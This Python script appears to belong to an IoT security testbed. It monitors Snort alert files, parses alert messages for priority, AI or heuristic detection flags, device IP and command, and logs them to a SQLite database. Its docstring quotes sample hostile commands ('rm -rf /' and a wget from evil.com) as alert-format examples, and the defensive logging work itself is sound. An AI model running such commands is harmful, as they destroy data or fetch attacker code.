#!/usr/bin/env python3
"""
Snort Alert Database Logger - Enhanced Version
Monitors Snort alert files and logs them to SQLite database
Parses enhanced alerts with priorities and logs to security_events table
"""

import os
import sys
import time
import re
import json
import sqlite3
import hashlib
from pathlib import Path
from datetime import datetime

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from snort_mqtt_logger import SnortMQTTLogger, parse_snort_alert_fast, parse_snort_json
from query_flags_helper import FlagsQueryHelper

def parse_enhanced_alert_message(message):
    """
    Parse enhanced alert message to extract priority, threat level, command, etc.
    
    Format examples:
    - "[CRITICAL] Malicious Command Detected - AI BLOCK + Heuristic MAL | IP: 192.168.1.100 | Command: rm -rf /"
    - "[HIGH] Suspicious Command - AI BLOCK | IP: 192.168.1.100 | Command: wget http://evil.com/script.sh"
    - "[MEDIUM] Dangerous File Operation Detected - rm -rf pattern"
    - "[INFO] MQTT PUBLISH Packet Detected"
    """
    parsed = {
        'priority': None,
        'threat_level': None,
        'detection_method': None,
        'device_ip': None,
        'command': None,
        'message_type': None
    }
    
    if not message:
        return parsed
    
    # Extract priority level from message
    priority_match = re.search(r'\[(CRITICAL|HIGH|MEDIUM|INFO|LOW)\]', message)
    if priority_match:
        priority_str = priority_match.group(1)
        priority_map = {
            'CRITICAL': 1,
            'HIGH': 2,
            'MEDIUM': 3,
            'INFO': 4,
            'LOW': 4
        }
        parsed['priority'] = priority_map.get(priority_str, 4)
        parsed['threat_level'] = priority_str.lower()
        parsed['message_type'] = priority_str
    
    # Extract detection method
    if 'AI BLOCK + Heuristic MAL' in message or 'both' in message.lower():
        parsed['detection_method'] = 'both'
    elif 'AI BLOCK' in message or 'ai' in message.lower():
        parsed['detection_method'] = 'ai'
    elif 'Heuristic MAL' in message or 'heuristic' in message.lower():
        parsed['detection_method'] = 'heuristic'
    elif 'pattern' in message.lower() or 'Detected' in message:
        parsed['detection_method'] = 'pattern'
    else:
        parsed['detection_method'] = 'none'
    
    # Extract device IP
    ip_match = re.search(r'IP:\s*(\d+\.\d+\.\d+\.\d+)', message)
    if ip_match:
        parsed['device_ip'] = ip_match.group(1)
    
    # Extract command
    cmd_match = re.search(r'Command:\s*(.+?)(?:\s*\||$)', message)
    if cmd_match:
        parsed['command'] = cmd_match.group(1).strip()
    
    return parsed


def log_security_event(db_path, alert_data, parsed_info, flags_helper):
    """Log enhanced alert to security_events table - ALWAYS logs both heuristic and ML flags"""
    try:
        conn = sqlite3.connect(db_path, timeout=30.0)
        c = conn.cursor()
        
        # Get device MAC if available
        device_mac = None
        device_ip = parsed_info['device_ip'] or alert_data.get('source_ip')
        if device_ip:
            # Try to get MAC from database
            c.execute('''
                SELECT mac_address FROM ip_mac_mapping
                WHERE ip_address = ?
                ORDER BY last_seen DESC LIMIT 1
            ''', (device_ip,))
            result = c.fetchone()
            if result:
                device_mac = result[0]
        
        # ALWAYS get flags if command and IP are available (even if not in alert message)
        # This ensures both heuristic and ML flags are ALWAYS logged through Snort
        heuristic_flag = None
        ai_flag = None
        command = parsed_info.get('command')
        
        if command and device_ip:
            # Query flags from database (heuristic_flag and ai_flag)
            flags = flags_helper.get_flags(command, device_ip)
            heuristic_flag = flags.get('heuristic_flag')
            ai_flag = flags.get('ai_flag')
            
            # If flags not found in database, try to extract from alert message
            if not heuristic_flag or not ai_flag:
                message = alert_data.get('message', '')
                if 'Heuristic MAL' in message or 'Heuristic' in message:
                    if 'MAL' in message:
                        heuristic_flag = 'MAL'
                    elif 'NOR' in message or 'BEN' in message:
                        heuristic_flag = 'NOR'
                if 'AI BLOCK' in message or 'AI' in message:
                    if 'BLOCK' in message:
                        ai_flag = 'MAL'
                    elif 'ALLOW' in message:
                        ai_flag = 'NOR'
        
        # Determine if blocked (CRITICAL/HIGH = blocked, MEDIUM/LOW = not blocked in IDS mode)
        blocked = parsed_info['priority'] in [1, 2] if parsed_info['priority'] else False
        
        # Get test_run_timestamp for unified logging
        test_run_timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        
        # Insert into security_events table - ALWAYS includes both flags
        c.execute('''
            INSERT INTO security_events (
                timestamp, test_run_timestamp, event_type, mac_address, device_ip, command,
                threat_level, detection_method, ai_confidence,
                ai_flag, heuristic_flag, reason, blocked
            ) VALUES (datetime('now'), ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            test_run_timestamp,
            'snort_alert',
            device_mac,
            device_ip,
            command,
            parsed_info['threat_level'] or 'low',
            parsed_info['detection_method'] or 'none',
            None,  # ai_confidence (not available yet)
            ai_flag,  # ML flag - ALWAYS logged
            heuristic_flag,  # Heuristic flag - ALWAYS logged
            alert_data.get('message', ''),
            blocked
        ))
        
        conn.commit()
        conn.close()
        
    except Exception as e:
        print(f"⚠️  Error logging security event: {e}", file=sys.stderr)


def monitor_snort_alerts(session_log_dir):
    """Monitor Snort alert files and log to unified database with enhanced parsing"""
    # Unified logging: ONE session.db for all test runs
    db_path = os.path.join(session_log_dir, 'session.db')
    if not os.path.exists(db_path):
        db_path = os.path.join(session_log_dir, 'snort_mqtt.db')
    
    logger = SnortMQTTLogger(db_path)
    flags_helper = FlagsQueryHelper(db_path)
    
    # Unified logging: alert files are in session_log_dir directly (append mode)
    # Check unified alert file locations
    alert_paths = [
        os.path.join(session_log_dir, 'alert_fast'),
        os.path.join(session_log_dir, 'alert_json'),
        os.path.join(session_log_dir, 'alert_csv'),
        os.path.join(session_log_dir, 'alert_fast.txt'),
    ]
    
    print(f"📊 Enhanced Snort Alert Monitor (Unified Logging)")
    print(f"   Unified logs directory: {session_log_dir}")
    print(f"   Database: {db_path} (ONE database for ALL test runs)")
    print(f"   Alert files: Unified location (append mode)")
    print(f"   ✅ Parsing enhanced alerts with priorities and logging to security_events")
    
    # Track what we've already logged (using file position for append mode)
    file_positions = {}  # file_path -> last_position
    
    while True:
        try:
            # Check all alert file paths
            for alert_path in alert_paths:
                if os.path.exists(alert_path):
                    # Get current file size (for append mode tracking)
                    current_size = os.path.getsize(alert_path)
                    last_position = file_positions.get(alert_path, 0)
                    
                    # Only read new lines (append mode)
                    if current_size > last_position:
                        with open(alert_path, 'r') as f:
                            f.seek(last_position)
                            new_lines = f.readlines()
                            
                            for line in new_lines:
                                # Determine parser based on file type
                                if 'json' in alert_path.lower():
                                    alert_data = parse_snort_json(line.strip())
                                elif 'csv' in alert_path.lower():
                                    # CSV parsing can be added if needed
                                    continue
                                else:
                                    alert_data = parse_snort_alert_fast(line.strip())
                                
                                if alert_data:
                                    # Log to snort_alerts table (standard logging)
                                    logger.log_snort_alert(alert_data)
                                    
                                    # Parse enhanced alert message
                                    message = alert_data.get('message', '')
                                    parsed_info = parse_enhanced_alert_message(message)
                                    
                                    # Log to security_events table if it's an enhanced alert
                                    if parsed_info['priority'] and parsed_info['priority'] <= 3:
                                        log_security_event(db_path, alert_data, parsed_info, flags_helper)
                            
                            # Update file position
                            file_positions[alert_path] = current_size
            
            time.sleep(2)  # Check every 2 seconds
            
        except KeyboardInterrupt:
            print("\n🛑 Stopping alert monitor...")
            break
        except Exception as e:
            print(f"⚠️  Error monitoring alerts: {e}")
            import traceback
            traceback.print_exc()
            time.sleep(5)
    
    flags_helper.close()

if __name__ == "__main__":
    import sys
    session_dir = sys.argv[1] if len(sys.argv) > 1 else os.environ.get('SESSION_LOG_DIR', '.')
    monitor_snort_alerts(session_dir)
